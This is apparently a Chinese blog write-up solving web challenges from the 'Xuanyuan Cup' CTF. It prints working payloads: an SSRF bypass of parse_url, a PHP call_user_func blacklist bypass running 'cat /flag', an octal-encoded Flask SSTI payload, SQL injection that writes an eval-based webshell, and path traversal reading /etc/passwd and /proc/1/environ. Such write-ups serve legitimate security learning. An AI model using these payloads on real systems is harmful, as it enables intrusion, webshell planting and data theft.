---
title: “轩辕杯”云盾砺剑CTF挑战赛复现
date: 2025-05-22 23:37:59
tags:
- RCE
- ssrf
- sql
- ssti
category:
- 比赛复现
---

# “轩辕杯”云盾砺剑CTF挑战赛复现

# WEB

## **ezssrf1.0**

源码：

```
<?php
error_reporting(0);
highlight_file(__FILE__);
$url = $_GET['url'];

if ($url == null)
    die("Try to add ?url=xxxx.");

$x = parse_url($url);

if (!$x)
    die("(;_;)");

if ($x['host'] === null && $x['scheme'] === 'http') {
    echo ('Well, Going to ' . $url);
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $result = curl_exec($ch);
    curl_close($ch);
    echo ($result);
} else
    echo "(^-＿-^)";
Try to add ?url=xxxx.
```

这题主要考的是parse_url函数的特性

### pares_url

```
Example #1 parse_url() 例子
<?php
$url = 'http://username:password@hostname/path?arg=value#anchor';
print_r(parse_url($url));
?>
以上例程会输出：
Array
(
[scheme] => http
[host] => hostname
[user] => username
[pass] => password
[path] => /path
[query] => arg=value
[fragment] => anchor
)
```

---

这题需要我们传入url然后使parse_url解析之后的host为null，scheme为http。

只需要将http://后的两个斜杠改为一个即可

```
<?php
$url = 'http:/127.0.0.1/flag';
print_r(parse_url($url));
?>

#
Array
(
    [scheme] => http
    [path] => /127.0.0.1/flag
)
```

payload：

```
?url=http:/127.0.0.1/FFFFF11111AAAAAggggg.php
或者
http:@127.0.1/FFFFF11111AAAAAggggg.php
```

---

## ezrce

源码

```
<?php
error_reporting(0);
highlight_file(__FILE__);

function waf($a) {
    $disable_fun = array(
        "exec", "shell_exec", "system", "passthru", "proc_open", "show_source", 
        "phpinfo", "popen", "dl", "proc_terminate", "touch", "escapeshellcmd", 
        "escapeshellarg", "assert", "substr_replace", "call_user_func_array", 
        "call_user_func", "array_filter", "array_walk", "array_map", 
        "register_shutdown_function", "register_tick_function", "filter_var", 
        "filter_var_array", "uasort", "uksort", "array_reduce", "array_walk", 
        "array_walk_recursive", "pcntl_exec", "fopen", "fwrite", 
        "file_put_contents", "readfile", "file_get_contents", "highlight_file", "eval"
    );
    
    $disable_fun = array_map('strtolower', $disable_fun);
    $a = strtolower($a);

    if (in_array($a, $disable_fun)) {
        echo "宝宝这对嘛,这不对噢";
        return false;
    }
    return $a;
}

$num = $_GET['num'];
$new = $_POST['new'];
$star = $_POST['star'];

if (isset($num) && $num != 1234) {
    echo "看来第一层对你来说是小case<br>";
    if (is_numeric($num) && $num > 1234) {
        echo "还是有点实力的嘛<br>";
        if (isset($new) && isset($star)) {
            echo "看起来你遇到难关了哈哈<br>";
            $b = waf($new); 
            if ($b) { 
                call_user_func($b, $star); 
                echo "恭喜你，又成长了<br>";
            } 
        }
    }
}
?>
```

很明显要我们去利用调用函数call_user_func调用函数去命令执行。首先前两个判断很简单就能绕过。后面的话是一个黑名单过滤了很多函数。但是这里可以使用`readgzfile`函数

### readgzfile

该函数用于输出一个 `.gz` 文件的内容

但是对于非 gzip 格式的文件，直接读取内容

---

payload：

```
?num=1235

post:
new=readgzfile&star=/flag
```

还有一种解法：

我们可以使用`\`符号开头，这不会影响函数的调用，并且这里的过滤只是将整个字符串去在黑名单中比对，并不是字符串匹配过滤或者正则过滤。

```
?num=1235

post:
new=\system&star=cat /flag
```

---

## ezflask

简单的ssti，使用八进制绕过，先用脚本查找可用类

```
{{''["\137\137\143\154\141\163\163\137\137"]["\137\137\155\162\157\137\137"][1]["\137\137\163\165\142\143\154\141\163\163\145\163\137\137"]()[133]["\137\137\151\156\151\164\137\137"]["\137\137\147\154\157\142\141\154\163\137\137"]['\137\137\142\165\151\154\164\151\156\163\137\137']['\145\166\141\154']("\137\137\151\155\160\157\162\164\137\137\050\047\157\163\047\051\056\160\157\160\145\156\050\047\143\141\164\40\57\146\154\141\147\047\051\056\162\145\141\144\050\051")}}
```

我用的是fenjing一把梭。

---

## ezsql1.0

![](../image/“轩辕杯”云盾砺剑CTF挑战赛复现-1.png)

sql注入题，先fuzz测试一波，发现过滤了空格。然后这里是整形注入，3列

```
1select	发现能够正常查询，说明select会被替换成空
```

然后空格这里可以使用`%09`和`/**/`绕过

并且这里是有写入权限的，可以写入webshell，也可以使用联合查询，但是要注意使用复写绕过select过滤和绕过空格过滤

写入webshell

```
?id=-1%09union%09seselectlect%091,%27%3C?=eval($_POST[1]);?%3E%27,3%09into%09outfile%09%27/var/www/html/1.php%27#
```

蚁剑连接在/var/db.sql这里找到flag的base64编码后的值，然后解码即可。

也可以使用联合查询

```
?id=0/**/union/**/selselectect/**/1,2,group_concat(data)/**/from/**/flag#
```

---

## ez_web1

参考博客：https://blog.csdn.net/u011435712/article/details/46529759

### proc

在 /proc 目录里, 每个正在运行的进程都有一个以该进程 ID 命名的子目录, 其下包括如下的目录和伪文件：

该文件保存了进程的完整 命令行. 如果该进程已经被交换出内存, 或者该进程已经僵死, 那么就没有任何东西在该文件里, 这时候对该文件的读操作将返回零个字符. 该文件以空字符 null 而不是换行符作为结束标志.

```
/proc/self/environ 当前进程的环境变量
/proc/self/cmdline 文件查看当前进行进程执行命令
/proc/[pid]/fd 当程序打开一个文件, 会获得程序的文件描述符, 而此时如果文件被删除, 只会删除文件的目录项, 不会清空文件的内容, 原来的进程依然可以通过描述符对文件进行读取, 也就是说, 文件还存在内存里。
/proc/net/fib_trie、/proc/net/arp、/proc/net/route 内网探测
/sys/class/net/eth0/address mac地址
```

---

![](../image/“轩辕杯”云盾砺剑CTF挑战赛复现-2.png)

查看网页源码得到提示账号为`fly233`，密码是`123456789`

![](../image/“轩辕杯”云盾砺剑CTF挑战赛复现-3.png)

进入另一个页面，有三个按钮随便点一个，然后发现有传参

![](../image/“轩辕杯”云盾砺剑CTF挑战赛复现-4.png)

发现可以路径穿越、目录遍历

```
book_path=../../../../etc/passwd
```

![](../image/“轩辕杯”云盾砺剑CTF挑战赛复现-5.png)

最后在`/proc/1/environ`找到flag

```
book_path=../../../../proc/1/environ
```





























